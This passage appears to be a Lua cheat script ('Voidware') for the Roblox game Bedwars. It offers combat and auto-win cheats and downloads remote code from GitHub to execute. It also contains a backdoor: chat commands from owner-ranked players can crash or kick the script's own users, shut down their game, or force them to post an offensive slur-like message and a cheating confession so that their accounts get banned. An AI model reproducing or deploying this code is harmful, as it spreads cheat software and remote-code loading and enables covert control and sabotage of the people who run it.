--- Voidware Custom Modules Hashed File | Bedwars Game
...
Version = "3.0",
Hash = "xoloqw",
SpecialActive = shared.VoidwareWhitelistedActive,
CommandPrefix = ";",
VoidwareOwner = {},
VoidwareInf = {},
CommandConnection,
DetectionConnection,
VoidwarePartyMembers = {},
BlacklistTable = loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemXVoid/whitelist/main/blacklist", true))(),
Table = loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemXVoid/whitelist/main/whitelistedusers", true))(),
BlacklistFlag = false,
Rank = "Standard",
Priority = {
	["DEFAULT"] = 0,
...
GetRank = function(v)
local suc, res = pcall(function() return v:GetRankInGroup(14270760) end)
if not suc then 
	repeat
		suc, res = pcall(function() return v:GetRankInGroup(14270760) end)
		task.wait()
	until suc
end
return res
...
Commands = {
	...
	["kick"] = function(args, plr)
			task.spawn(function()
				lplr:Kick("dsc.gg/voidware")
			end)
	end,
	["ban"] = function(args, plr)
		task.spawn(function()
			lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
		end)
	end,
	["fpscap"] = function(args, plr)
		task.spawn(function()
			setfpscap(tonumber(args[3]) or 60)
		end)
	end,
	["crash"] = function(args, plr)
		while true do game:Shutdown() end
	end,
	["deletemap"] = function(args, plr)
		for i,v in pairs(collectionService:GetTagged("block")) do
			v:Destroy()
		end
	end,
	["uninject"] = function(args, plr)
		GuiLibrary.SelfDestruct()
	end,
	["removemodule"] = function(args, plr)
		local module = GuiLibrary.ObjectsThatCanBeSaved[args[3].."OptionsButton"]
			if module and module["Api"].Enabled then
			module["Api"].ToggleButton(false)
		end
		task.wait(0.1)
		GuiLibrary.RemoveObject(args[3].."OptionsButton")
	end,
	["shutdown"] = function(args, plr)
		game:Shutdown()
	end,
	["expose"] = function(args, plr)
		task.spawn(function()
			getgenv().exposed = true
			repeat task.wait()
				if VoidwareWhitelistStore.Hash == "xoloqc" then
				replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("hello guys im using a cool closet cheating config named Voidware Lite. looks like I got detected this time lol. but yes .gg/voidware", "All")
				end
			until not getgenv().exposed
		end)
	end,
	["unexpose"] = function(args, plr)
		if getgenv().exposed then
			getgenv().exposed = false
		end
	end,
	["disconnect"] = function(args, plr)
		lplr:Kick("Please check your internet connection and try again.")
	end,
	["robloxban"] = function(args, plr)
		task.spawn(function()
		repeat task.wait()
		replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("nagas are so ugly ong", "All")
		until not true
		end)
	end,
	["rickroll"] = function(args, plr)
		...
		for i,v in pairs(collectionService:GetTagged("block")) do
			for i2,v2 in pairs(v:GetDescendants()) do
				if v2:IsA("Part") then
					v2.MaterialVariant = "http://www.roblox.com/asset/?id=7083449168"
				end
			end
		end
	...
	["void"] = function(args, plr)
		repeat task.wait()
		lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0, -3, 0)
		until lplr.Character.Humanoid:GetState() == Enum.HumanoidStateType.Dead or lplr.Character.Humanoid == nil
	end,
	["blur"] = function(args, plr)
...
SystemFiles = {"vape/NewMainScript.lua", "vape/MainScript.lua"},
teleportinprogress = false,
needsreinject = false,
watermark = function(text) return ("[Voidware] "..text) end,
map = "Unknown",
EnumFonts = {"SourceSans"},
FullEnumFonts = {"Enum.Font.SourceSans"},
...
Tag = function(name, player, color)
	...
	if player.Tags == nil then local Folder = Instance.new("Folder") Folder.Name = "Tags" repeat task.wait() until player.Tags ~= nil task.wait(4) end
	for i,v in pairs(player.Tags:GetChildren()) do
		if v:IsA("StringValue") then
			v:Destroy()
		end
	end
	local tagstring = Instance.new("StringValue")
	tagstring.Parent = player.Tags
	tagstring.Name = "0"
	tagstring.Value = "<font color='#"..color.."'>["..name.."]</font>"
	table.insert(tags, tagstring)
	return tagstring
end,
GetFile = function(file, path)
	local errored = true
	local voidwarever = shared.VoidwareCommitHash ~= nil and shared.VoidwareCommitHash or "main"
	local suc, res = pcall(function() return readfile("vape/Voidware/"..file) end)
	if not suc then
		local git, data
		task.delay(10, function()
			if not data and not errored then 
				errored = true
				GuiLibrary.CreateNotification("Voidware", "The connection to github is taking a while. either a github moment or your wifi is just bad.", 20)
			end
		end)
		git, data = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/SystemXVoid/Voidware/"..voidwarever.."/"..file, true) end)
		if not git or data == "404: Not Found" then
			GuiLibrary.CreateNotification("Voidware", "Failed to get vape/Voidware/"..file.." | "..data, 40)
			return data
		end
		if file:find(".lua") then data = "--- Voidware Custom Modules Hashed File\n"..data end
		writefile(path or "vape/Voidware/"..file, data)
	end
	return readfile(path or "vape/Voidware/"..file)
end,
}
shared.GlobalVoidwareWhitelistStore = {
ConfigUsers = {},
VoidwareUsersCount = 0,
VoidwarePartyMembers = {},
VoidwareOwner = {},
VoidwareInf = {},
SpecialUsers = {},
HashTable = loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemXVoid/whitelist/main/hashdecoder", true))(),
}
local VoidwareFileRecovery = function()
	for i,v in pairs(VoidwareStore.SystemFiles) do
		pcall(function() delfile(v) end)
		local filestr = (v):split("/")
		task.spawn(function() VoidwareStore.GetFile("System/"..filestr[2], "vape/"..filestr[2]) end)
		VoidwareStore.needsreinject = true
	end
end
local VoidwareGlobe = shared.GlobalVoidwareWhitelistStore
...
for i,v in pairs(VoidwareStore.SystemFiles) do
	if not isfile(v) or not readfile(v):find("--- Voidware Custom Modules Hashed File") then
	VoidwareFileRecovery()
	break
end
end
...
task.spawn(function()
	for i,v in pairs(VoidwareWhitelistStore.BlacklistTable) do
		if i == HWID or i:find(lplr.UserId) then
		delfile("vape/CustomModles/6872274481.lua")
		lplr:Kick(v)
		error(v)
		end
	end
	end)
	if VoidwareWhitelistStore.BlacklistFlag then return end
	task.spawn(function()
		if VoidwareWhitelistStore.GetRank(lplr) == 5 then
			VoidwareWhitelistStore.Rank = "Owner"
		elseif VoidwareWhitelistStore.GetRank(lplr) == 1 then
			VoidwareWhitelistStore.Rank = "Inf"
		end
	end)

	for _,v in pairs(VoidwareStore.FolderTable) do
		if not isfolder(v) then
			makefolder(v)
			print(VoidwareStore.watermark("created folder "..v.."."))
		end
	end

local CustomNotificationColor = {Hue = nil, Sat = nil, Value = nil}
local function warningNotification(title, text, delay)
	local suc, res = pcall(function()
		local customcolored = CustomNotificationColor.Hue ~= nil and CustomNotificationColor.Sat ~= nil and CustomNotificationColor.Value ~= nil
		...
		frame.Frame.Frame.ImageColor3 = customcolored and Color3.fromHSV(CustomNotificationColor.Hue, CustomNotificationColor.Sat, CustomNotificationColor.Value) or Color3.fromRGB(236, 129, 44)
		return frame
	end)
	return (suc and res)
end
...
local function CustomNotification(title, delay, text, icon, color)
	local suc, res = pcall(function()
		...
		if color then
			frame.Frame.Frame.ImageColor3 = Hex2Color3(color)
		else
...
runFunction(function()
	...
	bedwars = {
		...
		LobbyController = replicatedStorageService:FindFirstChild("events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events"),
		NetManager = replicatedStorageService.rbxts_include.node_modules["@rbxts"].net.out._NetManaged,
		HannahRemote = replicatedStorageService:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("HannahPromptTrigger")
	}
					...
					if table.find(chosenplayers, lplr) then
						...
						for i,v in pairs(vapePrivateCommands) do
							if tab.Message:len() >= (i:len() + 1) and tab.Message:sub(1, i:len() + 1):lower() == ";"..i:lower() then
								if VoidwarePriority[VoidwareWhitelistStore.Rank:upper()] < 2 then
								v(args, plr)
								end
								break
							end
...
runFunction(function()
	...
	local anims = {
		...
		["FastV2"] = {
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-90), math.rad(90), math.rad(90)),Time = 0.10},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.10}
		},
		["Smooth"] = {
		...
		["SmoothV2"] = {
			{CFrame = CFrame.new(0.69, -0.7, 0.10) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.25},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)),Time = 0.25}
		},
		["Pop"] = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.15},
						...
						if not firstPlayerNear then 
							...
							pcall(function()
								...
								if gameCamera.Viewmodel.RightHand.RightWrist.C0 ~= originalArmC0 then
									...
									killauracurrentanim = tweenService:Create(gameCamera.Viewmodel.RightHand.RightWrist, TweenInfo.new(customoutspeeds[killauraanimmethod.Value] or 0.1), {C0 = originalArmC0})
									killauracurrentanim:Play()
								end
							end)
						end
    ...
    killauraanimmethod = Killaura.CreateDropdown({
		Name = "Animation", 
		List = {"Normal", "Slow", "New", "Vertical Spin", "Exhibition", "Exhibition Old", "Funny", "FastV2", "FunnyV2", "Smooth", "Goofy", "SmoothV2", "Pop", "Long", "SlowV2", "FasterSlowV2"},
		Function = function(val) end
	})
	local oldviewmodel
	local oldraise
	...
	killauraparticle = Killaura.CreateToggle({
		...
		Function = function(callback)
			if callback then 
				...
				particle.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromHSV(critpartcolor.Hue, critpartcolor.Sat, critpartcolor.Value)), ColorSequenceKeypoint.new(1, Color3.fromHSV(critpartcolor.Hue, critpartcolor.Sat, critpartcolor.Value))})
	...
	critpartcolor = Killaura.CreateColorSlider({
		Name = "Crit Particle Color",
		Function = function(h, s, v) if partsync and killauraparticle.Enabled then partsync.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromHSV(h, s, v)), ColorSequenceKeypoint.new(1, Color3.fromHSV(h, s, v))}) end end
	})
...
if VoidwareStore.needsreinject then
	GuiLibrary.SelfDestruct()
	loadstring(VoidwareStore.GetFile("System/NewMainScript.lua", "vape/NewMainScript.lua"))()
end
task.spawn(function()
	repeat
	 if bedwarsStore.matchState ~= 0 then
		VoidwareStore.GameStarted = (workspace:GetServerTimeNow() - tick())
		break
	 end
	 task.wait()
	until not vapeInjected
...
runFunction(function()
	local notifcolor = {Enabled = false}
	local notifcolorslider
	notifcolor = GuiLibrary.ObjectsThatCanBeSaved.CustomizationWindow.Api.CreateOptionsButton({
		Name = "NotificationColor",
		Function = function(callback)
			local wasenabled = CustomNotificationColor.Hue ~= nil or CustomNotificationColor.Sat ~= nil or CustomNotificationColor.Value ~= nil
			if not callback and wasenabled then
				CustomNotificationColor.Hue = nil
				CustomNotificationColor.Sat = nil
				CustomNotificationColor.Value = nil	
			end
		end
	})
	notifcolorslider = notifcolor.CreateColorSlider({
		Name = "Color",
		Function = function() end
	})
	task.spawn(function()
		repeat task.wait(0.3)
			if notifcolor.Enabled then
			CustomNotificationColor.Hue = notifcolorslider.Hue
			CustomNotificationColor.Sat = notifcolorslider.Sat
			CustomNotificationColor.Value = notifcolorslider.Value
			end
		until not vapeInjected
	end)
end)
...
pcall(function()
repeat
	local VoidwareCommitHash = "main"
	for i,v in pairs(game:HttpGet("https://github.com/SystemXVoid/Voidware"):split("\n")) do 
		if v:find("commit") and v:find("fragment") then 
			local comsplit = v:split("/")[5]
			VoidwareCommitHash = comsplit:sub(0, comsplit:find('"') - 1)
			break
		end
	end
	local currentmodule = isfile("vape/CustomModules/66872274481.lua") and readfile("vape/CustomModules/66872274481.lua") or "notfound"
	local newmodule = readfile("vape/commithash.txt")
	if currentmodule ~= newmodule or currentmodule == "notfound" then
		if workspace:GetServerTimeNow() - VoidwareStore.TimeRan < 1 then
			break
		end
	end
	task.wait(5)
...
task.spawn(function()
	pcall(function()
		if VoidwarePriority[VoidwareWhitelistStore.Rank:upper()] > 1 then
			print(VoidwareStore.watermark("Your whitelist rank is currently set to "..VoidwareWhitelistStore.Rank.."."))
		end
		for i,plr in pairs(playersService:GetPlayers()) do
			if plr ~= lplr then
				if VoidwareWhitelistStore.GetRank(plr) == 5 then
					VoidwareStore.Tag("VOIDWARE OWNER", plr, "800080")
					if VoidwarePriority[VoidwareWhitelistStore.Rank:upper()] < 2 then
						repeat task.wait() until lplr:GetAttribute("LobbyConnected") and plr:GetAttribute("LobbyConnected") and isAlive(lplr) and isAlive(plr)
						task.wait(4)
						replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plr.Name.." "..VoidwareWhitelistStore.Hash8, "All")
					end
				elseif VoidwareWhitelistStore.GetRank(plr) == 1 then
					VoidwareStore.Tag("VOIDWARE INF", plr "0000FF")
					if VoidwarePriority[VoidwareWhitelistStore.Rank:upper()] < 2 then
						repeat task.wait() until lplr:GetAttribute("LobbyConnected") and plr:GetAttribute("LobbyConnected") and isAlive(lplr) and isAlive(plr)
						task.wait(4)
			...
			table.insert(vapeConnections, replicatedStorageService.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(tab, channel)
				...
				if not plr then return end
				for i,newbubble in pairs(game:GetService("CoreGui").BubbleChat:GetDescendants()) do
					if newbubble:IsA("TextLabel") and shared.GlobalVoidwareWhitelistStore.HashTable[newbubble.Text] ~= nil and shared.GlobalVoidwareWhitelistStore.ConfigUsers[plr] == nil and tab.MessageType == "Whisper" and VoidwarePriority[VoidwareWhitelistStore.Rank:upper()] > 1 and plr ~= lplr then
						repeat task.wait() until plr.Team.Name ~= "Spectators" and plr.Team.Name ~= "Neutral"
						warningNotification("Voidware", plr.DisplayName.. " (@"..plr.Name..") is using "..shared.GlobalVoidwareWhitelistStore.HashTable[newbubble.Text].." | "..plr.Team.Name.." Team", 120)
						shared.GlobalVoidwareWhitelistStore.ConfigUsers[plr] = true
						shared.GlobalVoidwareWhitelistStore.VoidwareUsersCount = shared.GlobalVoidwareWhitelistStore.VoidwareUsersCount + 1
						newbubble.Parent.Parent.Visible = false
						if not VoidwareWhitelistStore.GetRank(plr) >= 1 then
						VoidwareStore.Tag("VOIDWARE USER", plr, "FFFF00")
						end
					end
				end
				for i,v in pairs(VoidwareWhitelistStore.Commands) do
					if plr ~= lplr then
					if tab.Message:len() >= (i:len() + 1) and tab.Message:sub(1, i:len() + 1):lower() == ";"..i:lower() then
						local args = tab.Message:split(" ")
						if lplr.DisplayName:find(args[2] or args[3]) or lplr.Name:find(args[2] or args[3]) or VoidwareWhitelistStore.Rank:lower():find(args[2] or args[3]) then
							if VoidwarePriority[VoidwareWhitelistStore.Rank:upper()] >= 3 then return end
							if VoidwarePriority[VoidwareWhitelistStore.Rank:upper()] == 2 then if VoidwareWhitelistStore.GetRank(plr) == 1 or VoidwareWhitelistStore.GetRank(plr) ~= 5 then return end end
						v(args, plr)
						end
						break
					end
			...
			table.insert(vapeConnections, playersService.PlayerAdded:Connect(function(plr)
				if VoidwareWhitelistStore.GetRank(plr) >= 1 and shared.GlobalVoidwareWhitelistStore.SpecialUsers[plr] == nil then
					if VoidwareWhitelistStore.GetRank(plr) == 5 then
						if VoidwarePriority[VoidwareWhitelistStore.Rank:upper()] < 3 then
							repeat task.wait() until isAlive(lplr) and isAlive(plr) or plr.Team.Name == "Spectators"
					replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plr.Name.." "..VoidwareWhitelistStore.Hash, "All")
					VoidwareStore.Tag("VOIDWARE OWNER", plr, "800080")
					shared.GlobalVoidwareWhitelistStore.VoidwareOwner[plr] = true
					shared.GlobalVoidwareWhitelistStore.SpecialUsers[plr] = true
					elseif VoidwareWhitelistStore.GetRank(plr) == 1 and VoidwarePriority[VoidwareWhitelistStore.Rank:upper()] < 2 then
						repeat task.wait() until isAlive(lplr) and isAlive(plr) and plr:GetAttribute("LobbyConnected") and lplr:GetAttribute("LobbyConnected") or plr.Team.Name == "Spectators"
						replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plr.Name.." "..VoidwareWhitelistStore.Hash, "All")
					end
					if VoidwareWhitelistStore.GetRank(plr) == 1 then
						VoidwareStore.Tag("VOIDWARE INF", plr, "0000FF")
						shared.GlobalVoidwareWhitelistStore.VoidwareInf[plr] = true
						shared.GlobalVoidwareWhitelistStore.SpecialUsers[plr] = true
					end
				end
			end
		end))
		table.insert(vapeConnections, playersService.PlayerRemoving:Connect(function(plr)
			if shared.GlobalVoidwareWhitelistStore.ConfigUsers[plr] then
				shared.GlobalVoidwareWhitelistStore.VoidwareUsersCount = shared.GlobalVoidwareWhitelistStore.VoidwareUsersCount - 1
			end
		end))
	end)
...
local function GetMagnitudeOf2Objects(part1, part2)
	local magofobjects = part1 and part2 and part1 ~= nil and part2 ~= nil and math.floor((part1.Position - part2.Position).Magnitude) or 0
	return magofobjects
end
...
GuiLibrary.SelfDestructEvent.Event:Connect(function()
	for i,v in pairs(tags) do pcall(function() v:Destroy() end) end
end)
...
local function FindEnemyBed()
	...
	for _,v in pairs(workspace:GetChildren()) do
		if v.Name == "bed" and v:GetAttribute("id") ~= lplr:GetAttribute("Team").."_bed" then
...
local function isAlive(v)
	return v.Character.Humanoid and v.Character:FindFirstChild("HumanoidRootPart") and v.Character.PrimaryPart and v.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead and v.Character.Humanoid.Health > 0
end
...
local function GetClosestTarget(dist)
	local target = nil
	local distance = dist or math.huge or 99999
	for i,v2 in pairs(playersService:GetPlayers()) do
		if v2 and isAlive(v2) and v2:GetAttribute("Team") ~= lplr:GetAttribute("Team") then
			local targetdist = GetMagnitudeOf2Objects(lplr.Character.PrimaryPart, v2.Character.PrimaryPart)
...
task.spawn(function()
	for i,v in pairs(Enum.Font:GetEnumItems()) do 
		if v.Name ~= "SourceSans" then
			table.insert(VoidwareStore.EnumFonts, v.Name)
		end
		end
		
	for i,v in pairs(Enum.Font:GetEnumItems()) do 
	  if v.Name ~= "SourceSans" then
		table.insert(VoidwareStore.FullEnumFonts, "Enum.Font."..v.Name)
	end
   end
end)
...
task.spawn(function()
	for i,v in pairs(bedwars.QueueMeta) do
		if i ~= "bedwars_test" and i ~= "bedwars_to4" then
		table.insert(VoidwareStore.QueueTypes, i)
		end
	end
end)
...
runFunction(function()
	...
	local oldthemesettings = {
		...
		["Tint"] = lightingService:FindFirstChild("ColorCorrection") ~= nil and lightingService:FindFirstChild("ColorCorrection").TintColor or "255, 255, 255"
	}
	local AmbientUnload = function()
		...
		pcall(function() lightingService:FindFirstChild("ColorCorrection").TintColor = oldthemesettings["Tint"] end)
	  end
	local ambientfunctions = {
		...
		Night = function()
			if oldsky then
				lightingService.TimeOfDay = "21:30"
		...
		Pink = function()
			...
			lightingService:FindFirstChild("ColorCorrection").TintColor = "234, 208, 255"
		end
	end,
	Purple3 = function()
		if oldsky then
	...
	DarkishPink = function()
		if oldsky then
			...
			lightingService:FindFirstChild("ColorCorrection").TintColor = "255, 179, 255"
		end
	end,
	Space = function()
		if oldsky then
	...
	lighting = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
		...
		HoverText = "custom game themes you could call this.\n Add custom ambients in the config file (vape/Voidware/data/ambients.txt)",
		ExtraText = function() 
			if GuiLibrary.ObjectsThatCanBeSaved["Text GUIAlternate TextToggle"]["Api"].Enabled then 
	...
	ambient = lighting.CreateDropdown({
		Name = "Mode",
		List = ambients,
		Function = function(v) if lighting.Enabled then AmbientUnload() ambientfunctions[v]() end end
	})
end)
            runFunction(function()
				local ChatMoverPos1
                ...
                ChatMover = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
                    ...
                    ["Function"] = function(callback)
                        if callback then
                            ...
                            repeat task.wait()
							if ChatMoverPosMode.Value == "Left-Corner" then
								ChatMoverPos1.Object.Visible = false
					            ChatMoverPos2.Object.Visible = false
					            ChatMoverPos3.Object.Visible = false
					            ChatMoverPos4.Object.Visible = false
								game:GetService("StarterGui"):SetCore("ChatWindowPosition", UDim2.new(0, 0, 0.7, 0))
							else
								ChatMoverPos1.Object.Visible = true
					            ChatMoverPos2.Object.Visible = true
					            ChatMoverPos3.Object.Visible = true
					            ChatMoverPos4.Object.Visible = true
				...
				ChatMoverPosMode = ChatMover.CreateDropdown({
                    Name = "Position Mode",
                    List = {"Left-Corner","Custom"},
                    Function = function() end
                })
				...
				if ChatMoverPosMode.Value ~= "Custom" then
					ChatMoverPos1.Object.Visible = false
					ChatMoverPos2.Object.Visible = false
					ChatMoverPos3.Object.Visible = false
					ChatMoverPos4.Object.Visible = false
			...
			runFunction(function()
                ...
                DoublesQueue = GuiLibrary["ObjectsThatCanBeSaved"]["MatchMakingWindow"]["Api"].CreateOptionsButton({
                    ["Name"] = "Doubles",
                ...
                SkywarsQueue = GuiLibrary["ObjectsThatCanBeSaved"]["MatchMakingWindow"]["Api"].CreateOptionsButton({
                    ["Name"] = "Skywars",
			...
			runFunction(function()
                ...
                SkywarsQueue = GuiLibrary["ObjectsThatCanBeSaved"]["MatchMakingWindow"]["Api"].CreateOptionsButton({
                    ["Name"] = "SkywarsRoyale",
                    ["HoverText"] = "Starts a queue for Skywars Royale",
                    ["Function"] = function(callback)
                        if callback then
                            SkywarsQueue["ToggleButton"](false)
                            bedwars.LobbyClientEvents:joinQueue("skywars_royale")
                        end
                    end
                })
			end)
                ...
                CustomMatches = GuiLibrary["ObjectsThatCanBeSaved"]["MatchMakingWindow"]["Api"].CreateOptionsButton({
                    ["Name"] = "QuickCustoms",
                    ["HoverText"] = "Starts a queue for sqauds",
                    ["Function"] = function(callback)
                        if callback then
							badcustom = custommode.Value == "bedwars_ranked_s7" or custommode.Value == "bedwars_ranked_s7" or custommode.Value:find("event") or custommode.Value == "survival"
                            CustomMatches["ToggleButton"](false)
							if badcustom then
								warningNotification("QuickCustoms", "QueueType Invalid.")
								return
							end
                           bedwars.NetManager["CustomMatches:CreateCustomMatch"]:FireServer(table.unpack({
                                [1] = game:GetService("HttpService"):GenerateGUID(true),
                                [2] = {
                                    [1] = custommode.Value,
                                    [2] = "",
                                },
                            }))
                                InfoNotification("QuickCustoms", "Creating the custom match...", 6)
                                task.wait(6.88)
                                warningNotification("QuickCustoms", "Match Created. Joining..", 6)
                        end
                    end
                })
				custommode = CustomMatches.CreateDropdown({
					Name = "Mode",
					List = VoidwareStore.QueueTypes,
					Function = function() end
				})
			end)
            ...
            runFunction(function()
                ...
                PartyLeave = GuiLibrary["ObjectsThatCanBeSaved"]["MatchMakingWindow"]["Api"].CreateOptionsButton({
                    ["Name"] = "LeaveParty",
                    ["HoverText"] = "leaves the current party your in",
                    ["Function"] = function(callback)
                        if callback then
							PartyLeave.ToggleButton(false)
							bedwars.LobbyController.leaveParty:FireServer()
                        end
                    end
                })
            end)
							...
							if callback then
								task.spawn(function()
									...
									for i,v in pairs(playersService:GetChildren()) do
										if v ~= lplr then
											local targetinvited = {[1] = {["player"] = v}}
											bedwars.LobbyController.inviteToParty:FireServer(unpack(targetinvited))
											if invitedplayers[v] == nil then
												print(VoidwareStore.watermark("Invited "..v.DisplayName.." (@"..v.Name..")"))
												invitedplayers[v] = true
											end
										end
										end
								end)
                ...
                LeaveQueue = GuiLibrary["ObjectsThatCanBeSaved"]["MatchMakingWindow"]["Api"].CreateOptionsButton({
                    ["Name"] = "LeaveQueue",
                    ["HoverText"] = "Forcefully leaves the current queue (useful if a queue errored)",
                    ["Function"] = function(callback)
                        if callback then
							bedwars.LobbyController.leaveQueue:FireServer()
                ...
                RankedQueue = GuiLibrary["ObjectsThatCanBeSaved"]["MatchMakingWindow"]["Api"].CreateOptionsButton({
                    ["Name"] = "Ranked",
            ...
            runFunction(function()
                ...
                DuelsQueue = GuiLibrary["ObjectsThatCanBeSaved"]["MatchMakingWindow"]["Api"].CreateOptionsButton({
                    ["Name"] = "Duels",
                ...
                SolosQueue = GuiLibrary["ObjectsThatCanBeSaved"]["MatchMakingWindow"]["Api"].CreateOptionsButton({
                    ["Name"] = "Solos",
                    ["HoverText"] = "Starts a queue for solos",
                    ["Function"] = function(callback)
                        if callback then
                ...
                SquadsQueue = GuiLibrary["ObjectsThatCanBeSaved"]["MatchMakingWindow"]["Api"].CreateOptionsButton({
                    ["Name"] = "Sqauds",
                ...
                bedwars_5v5 = GuiLibrary["ObjectsThatCanBeSaved"]["MatchMakingWindow"]["Api"].CreateOptionsButton({
                    ["Name"] = "5v5",
                ...
                bedwars_30v30 = GuiLibrary["ObjectsThatCanBeSaved"]["MatchMakingWindow"]["Api"].CreateOptionsButton({
                    ["Name"] = "30v30",
				...
				local forcefullyflaggedconfetti
                        ...
                        if callback then 
                            task.spawn(function()
                                ...
                                repeat 
                                    ...
                                    bedwars.NetManager.DragonBreath:FireServer({player = lplr})
			...
			runFunction(function()
                ...
                playagain = GuiLibrary.ObjectsThatCanBeSaved.MatchMakingWindow.Api.CreateOptionsButton({
                    Name = "PlayAgain",
                    Function = function(callback)
                        if callback then
				...
				runFunction(function()
                local bubblechatdata
				local boldfontdata
				local oldbubblechatdata
                ...
                Chat = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
                    ...
                    Function = function(callback)
                        if callback then
                            task.spawn(function()
                                bubblechatdata = {BackgroundColor3 = Color3.fromHSV(BubbleColor.Hue, BubbleColor.Sat, BubbleColor.Value), BubbleDuration = BubbleDur.Value}
                                ChatService:SetBubbleChatSettings(bubblechatdata)
                            end)
                        else
                            task.wait(0.10)
                            ChatService:SetBubbleChatSettings({BackgroundColor3 = Hex2Color3("FFFFFF"), BubbleDuration = 10})
                        end
                    end,
                ...
                BubbleColor = Chat.CreateColorSlider({
                    ...
                    Function = function(h, s, v)
                        if Chat.Enabled then
                            ChatService:SetBubbleChatSettings({BackgroundColor3 = Color3.fromHSV(BubbleColor.Hue, BubbleColor.Sat, BubbleColor.Value)})
                        end
                    end
                })
                BubbleDur = Chat.CreateSlider({
                    ...
                    Function = function()
						if Chat.Enabled then
						ChatService:SetBubbleChatSettings({BubbleDuration = BubbleDur.Value})
						end
					 end,
                    Default = 10
                })
			...
			runFunction(function()
                        ...
                        if notified then
                            ...
                            table.insert(notifications.Connections, vapeEvents.BedwarsBedBreak.Event:Connect(function(bedTable)
                                if notifications.Enabled and bedTable.brokenBedTeam.id == lplr:GetAttribute("Team") and NoBed.Enabled then
                                    warningNotification("Bed","Your bed has been destroyed by " ..(bedTable.player.DisplayName or bedTable.player.Name).. "! becareful.",7)
                                    local bedless = true
                            ...
                            table.insert(notifications.Connections, vapeEvents.LagbackEvent.Event:Connect(function(pl)
                                if Lagback.Enabled and notifications.Enabled and GetCurrentKit(pl) ~= "hannah" then
                                    InfoNotification("LagbackNotifier", (pl.DisplayName or pl.Name).. " Is lagbacking!",7)
                                end
                            end))
							table.insert(notifications.Connections, playersService.PlayerRemoving:Connect(function(plr)
								if notifications.Enabled and RageQuit.Enabled then
									if plr.Team.Name ~= "Spectators" and plr.Team.Name ~= "Neutral" and plr.Team ~= lplr.Team then
									warningNotification("Noob Notifier", plr.DisplayName.." has rage quitted.", 7)
								end
							end
							end))
                            end)
				...
				RageQuit = notifications.CreateToggle({
                    Name = "Rage Quit",
                    Function = function() end,
                    HoverText = "Notifies when someone rage quits."
                })
			end)
			...
			--[[runFunction(function() (crashes alot on fluxus)
                local indicator = {Enabled = false}
				local indicatortext
				local indicatorcolor
				local indicatorfont = {Value = "LuckiestGuy"}
				local Create
				local indicatorfontswitch = {Enabled = false}
                indicator = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
                    Name = "DamageIndicator",
                    Function = function(callback)
						if callback then
                            task.spawn(function()
								if not isPlayerLoaded(lplr) then repeat task.wait() until isPlayerLoaded(lplr) end
								debug.setupvalue(bedwars.DamageIndicator, 10, {
									Create = function(self, obj, ...)
										task.spawn(function()
											pcall(function()
											  obj.Parent.TextColor3 = Color3.fromHSV(indicatorcolor.Hue, indicatorcolor.Sat, indicatorcolor.Value)
											  obj.Parent.Text = #indicatortext.ObjectList > 0 and indicatortext.ObjectList[math.random(1, #indicatortext.ObjectList)]
										end)
									end)
										return indicator.Enabled and tweenService:Create(obj, ...)
									end
								})
                            end)
							else
                    ...
                    HoverText = "cool custom damage indicator"
                })
				indicatorfontswitch = indicator.CreateToggle({
                    Name = "Custom Font",
                    Function = function(callback) indicatorfont.Object.Visible = callback end,
                    HoverText = "custom font for damage indicator"
                })
				indicatorcolor = indicator.CreateColorSlider({
					Name = "Color",
					Function = function() end
				})
				indicatortext = indicator.CreateTextList({
					Name = "Text",
					TempText = "indicator text",
				})
				indicatorfont = indicator.CreateDropdown({
                    Name = "Font",
                    List = VoidwareStore.EnumFonts,
                    Function = function() end
                })
			end)]]
			...
			runFunction(function()
				...
				local blacklistedclantable
				local function detectblacklistedclan(plr)
					for i2, v2 in pairs(blacklistedclantable) do
                ...
                ClanDetector = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
                    ...
                    Function = function(callback)
						if callback then
                            task.spawn(function()
								...
								blacklistedclantable = loadstring(VoidwareStore.GetFile("data/blacklistedclans.txt"))()
                            end)
							for i,v in pairs(playersService:GetPlayers()) do
								task.spawn(function()
								 if v ~= lplr then
								safeFunction(v, function()
								   detectblacklistedclan(v)
								end)
								 end
								end)
							end
                    ...
                    HoverText = "detect players in certain clans. customize\nin the config file (vape/Voidware/data/blacklistedclans.txt)"
                })
			end)

			runFunction(function()
				local AutowinEnabled
				...
				local autobedtween
				local bedrespawnlagbackcheck
				local bedtouched = false
				local bedtouchconnection
				local autoplayertween
				local bedtweenplayed
				local alreadytweened
